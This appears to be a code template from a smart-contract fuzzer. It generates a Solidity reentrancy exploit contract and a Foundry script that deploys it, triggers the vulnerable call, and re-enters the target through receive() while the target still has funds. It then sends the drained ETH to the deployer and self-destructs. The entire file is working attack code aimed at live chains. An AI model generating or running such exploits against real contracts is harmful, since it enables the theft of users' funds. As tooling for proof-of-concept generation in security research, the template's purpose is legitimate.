contract {{contract_name}}ReentrancyExploit {
    // Whoever deploys this (the broadcaster) is who gets the proceeds back
    // and who's allowed to trigger cleanup.
    address payable public beneficiary;

    constructor() {
        beneficiary = payable(msg.sender);
    }

    // Triggers the vulnerable call once. The actual exploitation then
    // happens through receive() being invoked mid-call (the same call-
    // stack reentrancy the fuzzer's control-leak mechanism found) -- there
    // is no explicit loop here, the recursion lives in receive() below.
    //
    // `payable`, and funded directly through THIS call (not by a separate
    // plain transfer before it) deliberately: a bare value transfer would
    // hit receive() below -- which is meant ONLY for the reentrant
    // callback during the attack -- before the attack has even started.
    function attack() external payable {
{{#each setup_calls}}
{{#with this}}
{{> tx_call}}
{{/with}}
{{/each}}
    }

    // Repeats the exact call the fuzzer found reentering during the leak,
    // for as long as the target still holds enough balance to make
    // continuing worth it -- the same guard a hand-written reentrancy
    // attacker would use, just derived from the trace instead of by hand.
    receive() external payable {
        if ({{repeat_tx.contract}}.balance >= msg.value) {
{{#with repeat_tx}}
{{> tx_call}}
{{/with}}
        }
    }

    // Forwards any ETH this contract is holding back to whoever deployed
    // it, then self-destructs. NOTE: because this always runs in a
    // SEPARATE transaction from the one that created this contract,
    // EIP-6780 (live since the Dencun/Cancun upgrade, on Sepolia and
    // mainnet both) means SELFDESTRUCT here only zeroes the balance -- it
    // does NOT remove this contract's bytecode from the chain. There's no
    // way to actually erase deployed code after the fact anymore; this is
    // as much cleanup as is possible.
    function collectAndDestroy() external {
        require(msg.sender == beneficiary, "not beneficiary");
        if (address(this).balance > 0) {
            // W3: full-gas `call`, never `.transfer()`. `.transfer()` forwards
            // only 2300 gas, which a CONTRACT beneficiary (a Gnosis Safe /
            // multisig recovery wallet, a treasury, any receive() that writes
            // storage) cannot run within -- the send would revert and the
            // proceeds would be stranded in this contract.
            (bool ok, ) = beneficiary.call{value: address(this).balance}("");
            require(ok, "beneficiary send failed");
        }
        selfdestruct(beneficiary);
    }
}

contract {{contract_name}}ReentrancyExploitRunner is Script {
    function run() external {
        vm.startBroadcast();

        // 1. Deploy the exploit contract.
        {{contract_name}}ReentrancyExploit exploit = new {{contract_name}}ReentrancyExploit();

        // 2. Trigger the vulnerable call once -- funded directly through
        //    this same call (see the comment on attack() for why a
        //    separate funding transfer first would misfire receive()) --
        //    receive() does the rest.
{{#if needs_funding}}
        exploit.attack{value: {{total_value}}}();
{{else}}
        exploit.attack();
{{/if}}

        // 3. Forward whatever the reentrancy loop collected back to this
        //    wallet, and self-destruct (see collectAndDestroy() above).
        exploit.collectAndDestroy();

        vm.stopBroadcast();
    }
}
